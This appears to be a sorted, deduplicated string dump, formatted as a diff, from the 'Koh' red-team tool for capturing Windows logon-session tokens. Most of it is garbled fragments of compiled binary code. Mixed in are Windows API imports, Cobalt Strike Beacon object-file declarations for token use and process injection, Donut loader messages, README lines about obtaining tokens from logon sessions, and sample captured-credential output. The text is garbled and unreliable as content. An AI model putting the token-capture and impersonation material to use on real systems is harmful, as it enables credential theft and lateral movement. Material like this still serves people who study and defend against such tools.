+$0Hl$8Ht$@H _
+$0Hl$8Ht$@H _2Ht
+$0Hl$8Ht$@H _@SH HAXHPx
+$0Hl$8Ht$@H _H
+$0Hl$8Ht$@H _H(
+$0Hl$8Ht$@H _H8Hd$(
+$0Ht$8H
+$0Ht$8H _
+$0Ht$8H _@SH 
+$0Ht$8H _@SH HA 
+$0Ht$8H _@SH HHu
+$0Ht$8H _@USVWAVHH
+$0Ht$8H _H
+$0Ht$8H _HHX
+$0Ht$8H _I
+$0Ht$8H _ff
+$0Ht$8H _oWH
+$0Ht$@H
+$0Hto
+$0IHl$8Ht$@H _H
+$0eH
+$8$x
+$8AH
+$8E3
+$8H _
+$8HD$0E
+$8Hl$@H _
+$8Hl$@H _H
+$8Ht$@H
+$8Ht$@H _@SH Q
+$8Ht$@H _]H(=}
+$8Hw
+$8IHp
+$8L$<
+$8L$<A
+$8LH
+$8t5HD$8H
+$=HA
+$>y{@>W9oM>W
+$@-DE
+$@-H
+$@3HD$HHD$XH
+$@DT$8DD$0L$(w
+$@H A
+$@H0_H
+$@H0_HC
+$@HD$XH
+$@HD$xD
+$@HD(<
+$@Hl$HHt$PH
+$@Hl$HHt$PH A_A
+$@Hl$HHt$PH0_L
+$@Ht$HH
+$@Ht$HH _@SH H
+$@Ht$HH0_
+$@Ht$HH0_1
+$@Ht$HH0_H
+$@Ht$HH0_WMuD8_
+$@Ht$PH
+$@IHt$HH0_
+$@I[0Ik8Is@IA_A
+$D$@
+$D3!l$
+$H@Hl$PH A
+$HD$
+$HD$ H
+$HH A
+$HH ]H(
+$HHH
+$HHl$PHt$XH A_A
+$HHt$PH0_Ht
+$HT$
+$HT$@
+$HcD$ A
+$Hk(
+$Hk(HL$
+$Hk(HT$
+$I$I
+$IT$
+$LEM
+$LIB<
+$P-H
+$P3Hl$XHt$
+$PD$h
+$PDXXD
+$PH0A
+$PH0A_3O
+$PH@_@UATAUAVAWH
+$PH@_LLMu
+$PHHt$
+$PHT$PA
+$PHl$
+$PHl$XHt$
+$PHt
+$PHt$
+$PHt$XH
+$PHt$XH@_
+$PHt$XH@_H
+$PHt$XH@_Hd$8
+$PLt$XH0A_H
+$Pt$0
+$Pt$0$
+$XAH A
+$XH A_A
+$XH0A
+$XHl$
+$XHl$HHt$PH A_A
+$XHt$
+$XT$
+$Xt$0D$PHd$
+$hE3H
+$hE3HE
+$hH0A_A
+$hH@A
+$hH@_@SVWH@H
+$hHH
+$hHP_@SH H
+$hHt$pHP_HHX
+$pHL$PH
+$pHPA
+$pHt$xH
+$pI[
+$pI[0Ik8Is@IA_A
+$pI[0Is@IA_A
+$pLA
+$qE}
+$xH@A_A
+$xHPA_H$
+$xH}H}H}@}
+$xLLm
+%>6>
+%L8@HD(H
+%{pk
+' as shown below:
+'HMJ
+'S5>
+( 8PX
+(8HXhx
+(>aIbQ=cQ6
+(HCXL
+(HD$@x
+(I need to test other logon situations like NetworkClearText.)
+(T!-V%1Y
+(null)
+(t$PHhff
+) or 3 of them
+) so _access_ should work as long as the captured account
+)>6{1n
+)AuI
+)D$<
+)E@u
+)F@J
+)HD$PH
+)HteT$
+)M3Ht
+)Q9%
+)S!d
+)[f.
+)dll
+)wd(
+- If a credential is present via a 
+- [Koh](
+-)4d
+--'  
+----
+-Ciu
+-D$@
+-HHA
+-MII
+. Load the 
+.(!>
+./Misc/Donut.exe
+.00cfg
+.>Tu
+.CRT$XCA
+.CRT$XCAA
+.CRT$XCZ
+.CRT$XIA
+.CRT$XIAA
+.CRT$XIAC
+.CRT$XIC
+.CRT$XIZ
+.CRT$XPA
+.CRT$XPX
+.CRT$XPXA
+.CRT$XPZ
+.CRT$XTA
+.CRT$XTZ
+.DS_Store
+.NET DLL
+.NET EXE
+.bss
+.data
+.dll
+.exe
+.idata$2
+.idata$3
+.idata$4
+.idata$5
+.idata$6
+.pdata
+.pipe
+.rdata
+.rdata$zzzdbg
+.rsrc$01
+.rsrc$02
+.rtc$IAA
+.rtc$IZZ
+.rtc$TAA
+.rtc$TZZ
+.text
+.text$mn
+.text$mn$00
+.text$x
+.user
+.vbs
+.xJ>Hfy
+.xdata
+/  /  /  __  
+//      Build Number
+//      Major Version
+//      Minor Version
+//      Revision
+// General Information about an assembly is controlled through the following
+// Setting ComVisible to false makes the types in this assembly not visible
+// The following GUID is for the ID of the typelib if this project is exposed to COM
+// The main namedpipe logic that handles commands for the Koh server
+// Version information for an assembly consists of the following four values:
+// You can specify all the values or you can default the Build and Revision Numbers
+// associated with an assembly.
+// by using the '
+// set of attributes. Change these attribute values to modify the information
+// to COM components.  If you need to access a type in this assembly from
+//WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t
+/>58d%
+/D$ D$ D$ 
+/LD$ H$8
+0').Trim()
+01/04/2021  11:43 AM    <DIR>          inetpub
+03/11/2022  04:10 PM    <DIR>          Users
+03/20/2020  12:28 PM    <DIR>          RBFG
+04/15/2021  09:44 AM    <DIR>          Program Files (x86)
+05/18/2022  01:27 PM    <DIR>          Program Files
+05/23/2022  06:30 PM    <DIR>          tools
+05/30/2019  03:08 PM    <DIR>          PerfLogs
+06/21/2022  01:30 PM    <DIR>          Windows
+0>To ->
+0AKP
+0I3H
+0Y7.
+0x%02x
+0x[0-9A-Fa-f]
+1. The first approach was to use 
+10/20/2021  01:14 PM    <DIR>          Temp
+1BALl
+1HD$(HHD$(HD$(
+1HK@H
+2. You can also focus on just RemoteInteractive logon sessions by using 
+23H=
+2@USVWATAUAVAWHHxH
+2H [@SH L
+2H [H
+2H [HcH
+2H(@SH 
+2H(H
+2H(H(
+2HHX
+2LIHA
+2tCHC 
+3!D$
+3!HD$(x<
+3)LD$PT$XHL$8
+3. Neither the name of the copyright holder nor the names of its
+30]X
+33D$$j
+37>k>
+3=l}
+3@3D$
+3@4D$
+3@PD$
+3@PVD$(P
+3A3rH
+3A>-
+3A@QUP
+3ADB
+3AH]ua
+3AHt
+3D$$
+3D$(VWP
+3DA8
+3DB33DB
+3DB@
+3E3AMHH
+3E3H
+3E3HT$
+3E3v@S
+3EpDE
+3H [@SH 3H
+3H [@SH H
+3H [H
+3H [HSH
+3H [Ht7SH L3H
+3H!T$0D
+3H$(
+3H(@SH0HHL$ 9
+3H(H(
+3H(H(Hu
+3H(H(W
+3H(HHX
+3H(LD$
+3H(_
+3H8HL$
+3H8LD$
+3H8LL$ LD$
+3HBHI
+3HD$ 
+3HD$ E
+3HE8(
+3HELL$@
+3HF 
+3HF <J
+3HH3tH
+3HH9
+3HH98
+3HHH
+3HHH$
+3HHLD$
+3HHP31Ht
+3HHt
+3HHt[H
+3HHtfH
+3HHu
+3HIA
+3HL$
+3HL$ A
+3HL$ H3DB
+3HL$ fff
+3HL$8H3
+3HL$@3
+3HL$@DB@
+3HL$PE
+3HL$p
+3HL$pA
+3HM(H3
+3HMA
+3HMDB47HUH
+3HMUHE9X
+3HP[H
+3HT$
+3Hd$ 
+3He/
+3Ht$0D$(
+3Ht$0Dt$(L$ HH E
+3HtJIH
+3HtSD
+3HtrHd$@
+3Hu.H
+3Hz(3HD$ WpHS
+3H}8H
+3I E
+3ICIICMCH$
+3IHH%
+3ILM_
+3L$ HT$0
+3L51
+3L=uHu
+3LD$DH
+3LIW
+3LL$ MHD$PHD$XL
+3LL$@
+3LM LEHU(HM
+3N$7HuLI
+3RIHL$ 
+3TRTRTR
+3U$4
+3V@0@
+3VHu
+3VVV
+3Vt$
+3WV< 
+3[D$
+3aD$ 
+3csm
+3iHU8H}8H'q
+3t:LIV
+3v2!L.2
+3yAGu
+4. The 
+4/'Pcq
+4MLL
+4d5350c8-7f8c-47cf-8cde-c752018af17e
+4pYYu
+5'Ps
+5AEt
+5H(H
+5H(ff
+5HD$HH
+5HEH
+5K0 /K0
+5bIP
+5dLu
+5q(7>
+5uxHc
+6>Tz3
+6D$(PVS
+6K]_
+6L==
+6LuLuLu
+6n16B(
+700WP
+7>.t
+7>qb
+7AMM
+7nH>
+7zQ6$
+80tWDF
+8D$8t
+8HLD$(H
+8H[WA
+8L3'HH
+8UHD$(A
+8Z(t
+8_(t
+8_(t_(HG
+8csmu
+8}O@
+9/jHFh
+91tn@(
+9D$ 
+9H@]H
+9HJD(AHD$8
+9t$Xt
+9u0u
+:1J<>
+:5VD
+:8'>0
+:>r-4@>%>b
+:RsPR5qR5ER5
+:SRTR8RO
+:cAs
+:kP<q
+:u(f9Q
+:uYHH
+< t<=u
+< t=<
+< tBt
+<(wXC=sF
+</OutputPath>
+</Project>
+<0tA:HQH
+<0uGK0
+<9tA
+<<6u
+<>Rm=1>
+<Ct-<D
+<G@@t$HHL$8L$
+<Nu'
+<StW@:tg<Zt
+<V7w8=O
+<configuration>
+<hC=
+<htl<jt
+<lt4<tt$<wt
+<tFtBt>L$
+<utT@:ug
+=D$8Dl$@
+=Eu0
+=HD$
+=imb
+>!Ix[
+>!T4<>
+>)MJ$>
+>.yCB
+>6t9
+>77:
+>8=pT=:
+>D$$
+>De}
+>He@>5A
+>HtAL
+>LD$@HH<t
+>]'p
+>cQ6
+>dn-/!>
+>eVM
+>f[t
+>jtm}S=
+>nOv
+>t%HH
+@.data
+@.reloc
+@.rsrc
+@0HC
+@0HE0AHD$8L
+@0U8
+@0](
+@2@t$ 
+@87t
+@88t
+@8>u
+@8HC
+@8HH
+@8l$Ht
+@9HA
+@:}<:u
+@:}@-u
+@@t<QH
+@ABCDEFGHIJKLMNOPQRSTUVWXYZ[
+@D$ 
+@D$ D$ D$$D$$
+@D$T
+@D3t
+@H=x
+@HPX
+@HT$0
+@HT$@HL$p
+@Hl$8
+@K0{8
+@PD$(P
+@SH 
+@SH 3
+@SH 3H
+@SH A
+@SH H
+@SH HJ0HHt
+@SH Hd$8
+@SH L
+@SH Mm
+@SH u/H
+@UATAUAVAWH
+@UH HH
+@UHH
+@_RDATA
+@aH ]@UH H
+@abcdefghijklmnopqrstuvwxyz[
+@dAA
+@l$pu
+@lAA
+@qH)V
+@t$ <
+@t9A
+@t}@@
+@u@ t
+@uVHtJ
+@x@XAA<d
+@zbj
+@}3WHD$8A
+A H(HA(Ph3H(H
+A HE0H
+A pointer to a locally unique identifier (LUID) that identifies the user. This parameter is provided for file-system processes such as network redirectors. 
+A tDE3Et4AH
+A$<u
+A/3A-w
+A8A0D
+A:1u
+A:tEtAA
+A>-u
+AA A
+AAHAT
+AAHI
+AAHT$@A
+AAL$
+AAPHHu
+AAst]AE
+AAtA
+ABCDEFGHIJKLMNOPQRSTUVWXYZ
+ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+ABCDEFGHIJKLMNOPQRSTUVWXYZ{
+ABLE
+AD8l$ht
+AD8}
+ADHUI
+ADVAPI32.dll
+AE$x
+AE3DP
+AEHT$@A
+AEHu
+AEIA
+AELmHcH
+AFT:EtSJ
+AGHDD
+AH A
+AH [HSHP
+AH(E
+AH0DE
+AH@H$0
+AHD$ 33VpHT$@H
+AHD$ L33Vp
+AHE03HD$8Ht$0D$(
+AHH3H
+AHI3I
+AHLE
+AHMH3DH$
+AHca
+AHd$0
+AIE7
+AIH3
+AK}Lc
+AL$(L
+AL$0
+ALcEA
+AMHHEu
+APE'MO
+APL$
+AQ@H
+AT$0Ht
+ATAVAWH0
+AVH Hc
+AVH0HHu
+AVHPH
+AWH0
+AcceptSecurityContext()
+Access is denied.
+According [to this post by a Microsoft engineer](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/using-debugging-tools-to-find-token-and-session-leaks/ba-p/400472):
+AcquireCredentialsHandle()
+Ai=1
+AineI
+AjDP
+Ak<A
+All notable changes to this project will be documented in this file.
+All rights reserved.
+AmsiInitialize
+AmsiScanBuffer
+AmsiScanString
+AnDP
+And we have no idea why.
+Any CPU
+Any CPU = Debug
+Any CPU = Release
+Any CPU.ActiveCfg = Debug
+Any CPU.ActiveCfg = Release
+Any CPU.Build.0 = Debug
+Any CPU.Build.0 = Release
+AppPolicyGetProcessTerminationMethod
+April
+AreFileApisANSI
+At!HUEIA
+Au!E
+August
+AuthPackage  : Kerberos
+AuthPackage  : Negotiate
+B4Au!E
+B8 t3ADB
+B8t8}$
+B8t8}mHL$8HT$0
+BAL$
+BD8@t
+BD8A
+BD8H
+BD8HL
+BD8Ht
+BDd$8
+BHD$PH
+BHD$pHD$HHM
+BHL$p
+BICS
+BL:DD8T$pu
+BL<A:t
+BL<DIL$
+BL=HU
+BLmMMA
+BOF client:
+BSD 3-Clause License
+Bl$X
+BncW[5
+Bt/E
+Bt9F<
+B}]9
+C$ has no label.
+CHK8H
+CHMH
+CHT$@I
+CL8J
+CLRCreateInstance
+CLi)k
+C]-H
+Cannot open file.
+CaptureTime  : 6/21/2022 1:23:10 PM
+CaptureTime  : 6/21/2022 1:24:42 PM
+CaptureTime  : 6/21/2022 1:24:50 PM
+Clients
+CloseClipboard
+CloseHandle
+CoCreateInstance
+CoInitializeEx
+CoUninitialize
+CommandLineToArgvW
+CompareStringEx
+CompareStringW
+CorBindToRuntime
+CorExitProcess
+CreateFileMappingA
+CreateFileW
+CreateThread
+CredUserName : da@THESHIRE.LOCAL
+CredUserName : harmj0y@THESHIRE.LOCAL
+CredUserName : localadmin@THESHIRE.LOCAL
+CryptAcquireContextA
+CryptGenRandom
+CryptReleaseContext
+D$ !
+D$ !T$<EHH
+D$ %LD$0HD$PX
+D$ 4LD$@HT$8EH
+D$ :
+D$ A
+D$ D
+D$ D$ 
+D$ D$ $0
+D$ D$ 3
+D$ D$ D$(9D$ s
+D$ D$ D$H9D$ s
+D$ D$ D$H9D$ s>D$ HL$(
+D$ D$ D$H9D$ sj3
+D$ D$ D$H9D$ sl3
+D$ D$ HcD$ H
+D$ G
+D$ H
+D$ H8DD$
+D$ H8HL$
+D$ H8HT$
+D$ HH
+D$ HHHL$
+D$ HHL$HH
+D$ HL$(
+D$ HL$0D
+D$ HL$@
+D$ HcD$ 
+D$ L$ 
+D$ L$ HL
+D$ L$ HT$8
+D$ L$$
+D$ LD$@HT$8EHU
+D$ LL$
+D$ LLD$0HD$PX
+D$ P
+D$ U3EVH
+D$ sLD$0HD$PX
+D$ t
+D$ w
+D$$D$ 
+D$$D$$
+D$$D$$H
+D$$D$(D$(aD$(
+D$$G 
+D$$H
+D$$HL$0H(
+D$$HL$8
+D$$PV
+D$$_t$
+D$$t
+D$$wTj
+D$($
+D$(AQ
+D$(D$(
+D$(D$()D$$L$ HT$8
+D$(D$(HcD$(Hk
+D$(DLL
+D$(DT$ x
+D$(H
+D$(H$
+D$(HEHD$ 7'
+D$(HEhHD$ HK9
+D$(HL$0H
+D$(IHEhHD$ )S
+D$(P<f
+D$(PD
+D$(PS}
+D$(PVS
+D$(Pj
+D$(U
+D$0 D$0$
+D$0)H
+D$03HL$8
+D$09
+D$0D$8:tGDD$0HL$pDD$ 
+D$0D$xHD$ D$
+D$0DL$(DD$ DLHHL$@
+D$0H
+D$0H$
+D$0HH$
+D$0HHHT$
+D$0HcD$0
+D$0I
+D$0P
+D$0PWS
+D$4 
+D$49C
+D$4@
+D$4PD$
+D$8$
+D$8$d
+D$8A
+D$8D$ E3DD$43HL$P
+D$8D$8
+D$8D$8PS=
+D$8DD$0
+D$8H
+D$8HEpt$0HD$(t$ _
+D$8HH$
+D$8Hp
+D$8IS
+D$<D$
+D$<D$XD$(Ph
+D$<L$
+D$<PS
+D$<QD
+D$@<$
+D$@D$
+D$@H
+D$@HP[H
+D$@IK
+D$@} D$ HL$P
+D$DDD$0
+D$DH
+D$H9D$ s
+D$HA
+D$HHMH3
+D$HHT$HLI4II
+D$HL$H3DD$TD$
+D$HPS03G9@
+D$Hv
+D$LH
+D$LHT$XIH
+D$P IKA@
+D$P-
+D$P=
+D$PA
+D$PHT$@
+D$PL$H3
+D$TD$L
+D$XE3
+D$XH
+D$XH8Hu
+D$Xs
+D$dHUH
+D$hA
+D$p_
+D$pt$4$t
+D$xB
+D$xD$ 
+D$xH
+D1 L1$
+D3D3AADA
+D3DAntelAGenuD
+D3E8
+D6Lu
+D8 u
+D8/u
+D8@u
+D8HHH
+D8T$pt
+D8T8>t
+D8d$
+D8t$8t
+D8}t
+D8}tBHE
+D<P0@:t
+D=AHu A
+D=W>6Z=
+DA (admin)
+DAAA
+DADD@
+DAHDD$p$
+DAHK
+DAIcA
+DAL$TL
+DALL3
+DAPHAHH
+DBA@ 
+DD$ HxHT$
+DD$(D$ @
+DD$@
+DD$@O
+DD$PLL$XAHS
+DD$PLL$XHS
+DD$T3
+DD$pLL$(D
+DD(j
+DDAt
+DE3E333
+DE3EH
+DECLSPEC_IMPORT BOOL   BeaconIsAdmin()
+DECLSPEC_IMPORT BOOL   BeaconUseToken(HANDLE token)
+DECLSPEC_IMPORT BOOL   toWideChar(char 
+DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptAcquireContextA( HCRYPTPROV 
+DECLSPEC_IMPORT WINADVAPI BOOL WINAPI ADVAPI32$CryptDestroyHash( HCRYPTHASH )
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$ImpersonateNamedPipeClient (HANDLE)
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$RevertToSelf (void)
+DECLSPEC_IMPORT WINBASEAPI HLOCAL WINAPI KERNEL32$LocalFree (HLOCAL)
+DECLSPEC_IMPORT char 
+DECLSPEC_IMPORT int     BeaconDataInt(datap 
+DECLSPEC_IMPORT int     BeaconDataLength(datap 
+DECLSPEC_IMPORT short   BeaconDataShort(datap 
+DECLSPEC_IMPORT void    BeaconDataParse(datap 
+DECLSPEC_IMPORT void    BeaconFormatAlloc(formatp 
+DECLSPEC_IMPORT void    BeaconFormatAppend(formatp 
+DECLSPEC_IMPORT void    BeaconFormatFree(formatp 
+DECLSPEC_IMPORT void    BeaconFormatInt(formatp 
+DECLSPEC_IMPORT void    BeaconFormatPrintf(formatp 
+DECLSPEC_IMPORT void    BeaconFormatReset(formatp 
+DECLSPEC_IMPORT void   BeaconCleanupProcess(PROCESS_INFORMATION 
+DECLSPEC_IMPORT void   BeaconInjectTemporaryProcess(PROCESS_INFORMATION 
+DECLSPEC_IMPORT void   BeaconRevertToken()
+DEHI
+DGT3H
+DGT3HE
+DGT3HL$05
+DGT3I{
+DGTIH
+DH)u
+DHC 
+DHCHHC 
+DHD$8H8
+DHH [H(H
+DHHH
+DHHHA84
+DHHa
+DHHtr
+DHKH
+DHM2
+DHSHH [H
+DHT$
+DHT$ LHH
+DHT$8
+DHT$pHML}IH
+DHUHb{HMLE
+DHd$ 
+DHd$8
+DHsJ
+DHt$ I
+DI BD
+DIH$
+DIH%
+DIOy
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+DIff
+DJH]H]H]H]HMH8]t
+DJmH
+DL$ LD$
+DLD$
+DLD$@HT$xHL$h
+DLHT$
+DPD$(rn
+Dd$(DMH
+Dd$(DMHt$ 
+Dd$(DMLd$ 
+Dd$0
+Dd$0Dl$D
+Dd$8t
+Debug
+December
+DeleteCriticalSection
+DfA9
+DllMain
+Donut's license is BSD 3-clause.
+Dt$(@EU
+Dt$DLL$@D$
+Dt$p
+Dt/8
+Dt8Hc
+DtEA
+DtREp
+DuLu
+DuMt:
+DuxEu
+Dx$L
+E E(HEHE
+E E(HEHEHEHE
+E HM
+E(f95
+E33:
+E33A
+E33D
+E33HL$8
+E33I
+E3AP
+E3Ac
+E3D 
+E3DD$ 
+E3DE3BLAI
+E3DP
+E3Du
+E3E333
+E3E333 ]H
+E3E3337H8H(
+E3E333FH(
+E3E333HHX
+E3E333UH
+E3E3E3Dd$ 3H(
+E3E3H
+E3E3tVHT$ HH
+E3EE
+E3H3
+E3HAP
+E3HH
+E3HHL
+E3HT$ 3
+E3HT$@HL$p:D$
+E3HU
+E3HUHt
+E3Hd$@
+E3Ht$ E333
+E3IA
+E3LE3BLAI
+E3LE3BT
+E3LHL}
+E3Ld$ E333TfH
+E3LuDA
+E3T$0HL$@
+E3fD9t$b
+E8 t
+E8/L
+E:!u
+E:u'J
+E@IF
+EAT$<EH
+EBPIBHE
+ED3AADO
+ED9Hc
+EDDDuAE3Du2e
+EDDE
+EDEMA
+EDE_HD$HHD$(HT$@HEoDHL$
+EDLl$0Hl$HLd$8H$
+EDMc3HILLO
+EDUMt:
+EDd$8E
+EE(H@]H
+EE33
+EE3E3D
+EE3H
+EEAADH
+EEAADHi
+EEAAT
+EEIH0E3A
+EEIHH$
+EGE3D$ 
+EH BE
+EHAj
+EHEH uaMt
+EHHE
+EHHHE
+EHL$HAHD$@[H%
+EHLcE
+EHMLA
+EHOHE
+EHT$<E
+EHd$8
+EHeH
+EH}HtVHUPfEP
+EIDMwHDEoHAHMy
+EIHE
+EIcD
+EIcH
+ELHL$ DAIoH8HHX
+ELL$0IEH
+EPPuD
+ET5>m
+EU} 
+EYfD
+EYfD9$
+EZ%qVJ
+E]B.4o
+Ef9)t
+EfL$
+Embedded
+EmptyClipboard
+EndGlobal
+EndGlobalSection
+EndProject
+EnterCriticalSection
+Enumerating logon sessions is easy (from an elevated context) through the use of the [LsaEnumerateLogonSessions()](https://docs.microsoft.com/en-us/windows/win32/api/ntsecapi/nf-ntsecapi-lsaenumeratelogonsessions) Win32 API. What is more difficult is taking a specific logon session identifier (LUID) and _somehow_ getting a usable token linked to that session.
+EpLA
+Error generating random values.
+Et/3
+EtAI
+EtF4
+EtTWt
+Eu3HL$@H3
+Eu6Y
+EuH(=
+EuH(=)$
+EuHH
+EwD$(EoD$ e
+ExitProcess
+F3Ht
+F>Ni
+FD(H
+FEMh
+FH8Hd$ 
+FT<A
+February
+File is a .NET DLL. Donut requires a class and method.
+File is empty.
+File is invalid.
+File not found.
+FileTimeToSystemTime
+FindClose
+FindFirstFileExW
+FindNextFileW
+FlsAlloc
+FlsFree
+FlsGetValue
+FlsSetValue
+FlushFileBuffers
+FreeEnvironmentStringsW
+FreeLibrary
+Friday
+G 8NhU]i<
+G Ht
+G MtHt$0AWPD$(
+G(HO
+G3HT$ 
+G@HH$0
+G@[p
+GD$8
+GDl$DAE
+GE H
+GHD$8H
+GHH(L3H
+GHHt%L
+GIcH
+GIcHA
+GetACP
+GetCPInfo
+GetCommandLineA
+GetCommandLineW
+GetConsoleCP
+GetConsoleMode
+GetCurrentDirectoryW
+GetCurrentProcess
+GetCurrentProcessId
+GetCurrentThread
+GetCurrentThreadId
+GetDriveTypeW
+GetEnvironmentStringsW
+GetFileInformationByHandle
+GetFileSizeEx
+GetFileType
+GetFullPathNameW
+GetLastError
+GetModuleFileNameW
+GetModuleHandleA
+GetModuleHandleExW
+GetModuleHandleW
+GetOEMCP
+GetProcAddress
+GetProcessHeap
+GetStartupInfoW
+GetStdHandle
+GetStringTypeW
+GetSystemTimeAsFileTime
+GetThreadContext
+GetTimeZoneInformation
+GetUserDefaultLCID
+Gl/eD$<E
+Global
+GlobalAlloc
+GlobalFree
+GlobalLock
+GlobalSection(ExtensibilityGlobals) = postSolution
+GlobalSection(ProjectConfigurationPlatforms) = postSolution
+GlobalSection(SolutionConfigurationPlatforms) = preSolution
+GlobalSection(SolutionProperties) = preSolution
+H A_A
+H H(@SH LHHt
+H H3E H3E
+H HLH
+H I sI I
+H [$1
+H [3u@SH H
+H [@SH =
+H [@SH H
+H [@SH H=Z
+H [@SH HHw<H
+H [@SH d$8
+H [A A HI
+H [ATAUAVHP
+H [E3
+H [H
+H [H%
+H [H%>
+H [H%G
+H [H%SF
+H [H%z
+H [H(
+H [H(A
+H [H(AA<Fu
+H [H(H
+H [H(L
+H [H0H%B
+H [HHX
+H [HHf<A
+H [HcH
+H [Ht
+H [HtfSH HH
+H [LI[
+H [LL
+H ] a@UH0H
+H ]3
+H ]@UH HH
+H ]@UH HHEX
+H ]@UH HHM0H ]@UH HH} 
+H ]@UH@H}x
+H ]@UHH
+H ]a@UH H
+H ]a@UH HH
+H ]a@UH HMPH ]@UH H
+H ]b@UH HHEH
+H ]b@UH HHMH
+H ]pa@UH H3H ]Za@UH H}p
+H ]y@UH HHEH
+H _@SH H3
+H _H
+H _H(Hu
+H _HUSVWAVHhH
+H$8-
+H$H(H(s-
+H$ZH$0
+H%.W
+H%Gp
+H(39
+H(3Hu
+H(9csmuQy
+H(<H(H
+H(@SE
+H(@SH =
+H(@SH H
+H(@SH HH!
+H(A/
+H(CH
+H(DL$ DD$
+H(E3E3HT$8HL$0
+H(H%
+H(H%'
+H(H(
+H(H(E3H
+H(H(H
+H(H(HL$0HT$8HT$8H
+H(H(u
+H(HD$0
+H(HD$0HD$
+H(HD$8HD$
+H(HHX
+H(HI
+H(HL$
+H(HL$0
+H(HL$0H
+H(HL$0HT$8DD$@H
+H(HL$0HT$8LD$@DL$HEHHL$@HHT$8A
+H(HL$0Hc@<HL$0H
+H(HL$0MH
+H(HL$0}t
+H(HT$
+H(HT$8HL$0
+H(HtH(E3H(
+H(HtI
+H(Hu
+H(LD$
+H(LcA<E3L
+H(MA8HI
+H(ff
+H(lS
+H(r@SH H3
+H(sH
+H-WLc
+H0A_A
+H0H%B
+H0HD$ 
+H0[H
+H1AH
+H3(jH$@
+H308
+H31H$
+H33E
+H33H
+H37H
+H3BL$@
+H3D$ H
+H3D$8HcL$(HT$ HD0
+H3D8u
+H3H 
+H3H$
+H3H$0
+H3H$@
+H3H$P
+H3HD$
+H3HD$ HD$HHD$
+H3HD$(
+H3HD$0E3L
+H3HD$8H3
+H3HD$@3LH LswD
+H3HD$@yT
+H3HD$PH$
+H3HD$PHD$pHD$8HD$xHD$0D$ 
+H3HE
+H3HE DEHMHM
+H3HE(Hc
+H3HE333
+H3HEE3IcHEy)f
+H3HEHIIID
+H3HEHM
+H3HEHcIHMhG
+H3HEL
+H3HELcepLcmhADMHcF
+H3HH
+H3HP
+H3H]@HuHH}PHe
+H3Hp
+H3L$
+H3L$@
+H3LLE
+H3TZHD$0HH
+H3cgL$P
+H3dL$@
+H3eL$p
+H3g0L$
+H3n@
+H3qL$
+H3s4
+H6H9H1HtH{
+H8A_A
+H8D$ 
+H8DL$ LD$
+H8H(
+H8H(H
+H8H8HL$ HT$(Ht
+H8HD$@HD$
+H8HD$@HD$(D$ 
+H8HD$@HD$(DD$HH
+H8HD$@HD$(H
+H8HD$@x
+H8HD$P
+H8HHh
+H8HL$
+H8HL$@
+H8HL$@HD$(HD$(
+H8HL$@m8PE
+H8HL$XHL$ LL$PLD$HHT$@H
+H8Hc
+H8Hd$ 
+H8IC
+H8LLMu
+H8fL$
+H8ff
+H93t
+H95)
+H95M
+H97u
+H988
+H9D$Hrc
+H9D$Hs:
+H9Gt
+H9Pt
+H9t$x
+H<HD(H
+H<MP
+H=L=A
+H@ HA !
+H@A_A
+H@SH0H
+H@[H
+H@[H(H
+H@[H(Hu
+H@]@UH@H}@
+H@]H
+H@_@SH H>
+H@_HHX
+H@}Rsc
+HA L@MtGMH
+HA(A
+HA(H
+HA8A
+HADB
+HAIH3
+HALA
+HAPH
+HBD>HcI
+HBL$
+HC H
+HC HK4y
+HC HpYC0L
+HC Hu
+HC t
+HC(c
+HCHt
+HD$ 
+HD$ (
+HD$ AQ
+HD$ D33VpH0
+HD$ E33SpHM
+HD$ E33VpHL$0
+HD$ E33VpI
+HD$ H
+HD$ H$
+HD$ H(
+HD$ HD$ 
+HD$ HHD$ HD$(HHD$(HD$(
+HD$ HX
+HD$ Ht
+HD$ L$(@
+HD$ L$0
+HD$ LD
+HD$ LD$
+HD$ t
+HD$(
+HD$( 
+HD$($
+HD$(0
+HD$(3H8HL$
+HD$(A
+HD$(A)
+HD$(DD$ D$
+HD$(H
+HD$(H$
+HD$(HD$(
+HD$(HD$@HcL
+HD$(HD$xHD$ ARXHHH
+HD$(HHD$(D$ )
+HD$(HHD$(HD$(
+HD$(HHD$(HD$@L
+HD$(IG(HD$ 
+HD$(L
+HD$(LL$ ELHHL$@H
+HD$(g
+HD$0
+HD$0 
+HD$0$
+HD$0(H
+HD$06H
+HD$08
+HD$0DH
+HD$0H
+HD$0H$
+HD$0H(DD$
+HD$0H9D$8
+HD$0H@
+HD$0HD$
+HD$0HD$xHD$8$
+HD$0HHD$03H(HT$
+HD$0HL$P0
+HD$0HL$PH3-
+HD$0HL$PI
+HD$0HL$PI H
+HD$0HP
+HD$0Ie
+HD$0L
+HD$0RH
+HD$0b 
+HD$0x
+HD$8
+HD$8 
+HD$8C8D$0L$(HL$
+HD$8D$ DHT$0HL$8
+HD$8H
+HD$8HD$
+HD$8HD$@D$0
+HD$8HcD$(Hk
+HD$@
+HD$@@ H
+HD$@D$(
+HD$@H
+HD$@H$
+HD$@HD$
+HD$@HD$@HD$HHT$HH
+HD$@HL$
+HD$@HcL
+HD$@HcX
+HD$@x
+HD$H
+HD$H.$
+HD$H3
+HD$HH
+HD$HHL$@
+HD$HHh
+HD$HL$
+HD$P
+HD$P@
+HD$PH
+HD$PHD$(
+HD$PHD$@HE
+HD$PHD$P
+HD$PHD$PHD$XHD$XHD$
+HD$PHL$0H@
+HD$PHcX
+HD$PI
+HD$PL$(8
+HD$Px
+HD$X.$
+HD$XH
+HD$XHH
+HD$h
+HD$hD9l$@
+HD$hH
+HD$hHT$hH
+HD$p
+HD$pH
+HD$pHD$pHD$xHT$xH
+HD$x.$
+HD$xHD$(HD$pHD$ 
+HD$xT$Pp
+HD(HN B
+HD0H
+HD3>3H
+HD8ut
+HDDI E
+HDHL$ {HHu
+HE(HD$8LE8Hd$0
+HE(e 
+HE0H
+HE0HELM
+HE3HL$@3
+HEHD$PHEH
+HEHH
+HEHUHE HEHM
+HEHUHE HMHE1H
+HEHu
+HELE
+HELM(HE
+HELMHE HELEHE(HEHU
